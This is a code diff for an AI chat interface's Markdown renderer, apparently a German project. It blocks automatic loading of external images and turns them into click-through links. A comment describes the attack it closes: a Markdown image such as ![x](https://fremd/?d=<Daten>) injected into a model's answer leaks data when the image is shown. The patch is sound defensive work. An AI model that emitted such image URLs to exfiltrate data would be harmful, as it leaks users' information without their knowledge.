@@ -149,6 +149,22 @@
             } catch (e) { return ''; }
         }
 
+        // Darf ein Markdown-Bild GELADEN werden? Nur eigene Quellen: relativer
+        // Pfad (aber nicht "//host", das ist eine fremde Adresse ohne Schema),
+        // data:-Bild, oder absolute Adresse mit gleicher Herkunft wie die Seite.
+        function _bildIntern(raw) {
+            const s = String(raw || '').trim();
+            if (/^data:image\//i.test(s)) return true;
+            if (/^\/(?![\/\\])/.test(s)) return true;
+            if (/^https?:\/\//i.test(s)) {
+                try {
+                    const ort = (global.location && global.location.origin) || '';
+                    return !!ort && ort !== 'null' && new URL(s).origin === ort;
+                } catch (_) { return false; }
+            }
+            return false;
+        }
+
         function _withToken(url) {
             // /api/knowledge/netzquelle gehoert dazu: der Quell-Link im Chat ist
             // eine Navigation ohne Header und verlangt (wie file_raw) ?token=.
@@ -241,8 +257,25 @@
             // Bilder ![alt](url)
             t = t.replace(/!\[([^\]\n]*)\]\(([^)\n]+)\)/g, (_, alt, url) => {
                 const raw = url.replace(/&amp;/g, '&');
-                const safe = /^https?:\/\/|^\/|^data:image\//.test(raw) ? _withToken(raw) : '';
-                if (!safe) return '';
+                // Pentest-Vorbereitung 2026-11-05 (Datenabfluss ohne Klick): ein
+                // FREMDES Bild laedt der Browser beim Anzeigen selbst – ein in
+                // eine Antwort eingeschleustes ![x](https://fremd/?d=<Daten>)
+                // schickte damit Daten weg, ohne dass jemand klickt. Geladen
+                // wird nur noch, was vom eigenen Server kommt (relativer Pfad,
+                // gleiche Herkunft) oder als data:-Bild eingebettet ist; ein
+                // fremdes Bild wird ein Link mit Hinweis, Klick oeffnet es in
+                // einem neuen Tab. Die CSP (img-src, backend/csp.py) ist die
+                // zweite Linie dahinter.
+                if (!_bildIntern(raw)) {
+                    if (!/^https?:\/\//i.test(raw) && !/^\/\//.test(raw)) return '';
+                    const hinweis = escapeHtml(_tt('media.ext_img',
+                        'Externes Bild – wird nicht automatisch geladen. Klick öffnet es in einem neuen Tab.'));
+                    const titel = alt || escapeHtml(_tt('media.ext_img_label', 'Externes Bild'));
+                    return _hold(`<a href="${_A(raw)}" target="_blank" rel="noopener noreferrer" `
+                         + `class="chat-img-extern" title="${_A(hinweis)}">${titel}</a>`
+                         + ` <span class="chat-img-extern-hinweis">(${hinweis})</span>`);
+                }
+                const safe = _withToken(raw);
                 return _hold(`<img src="${_A(safe)}" alt="${_A(alt)}" class="chat-img" loading="lazy" `
                      // BSI H4: kein onload mehr - der Capture-Listener oben
                      // (document, 'load') ruft __jarvisImgScroll fuer img.chat-img.
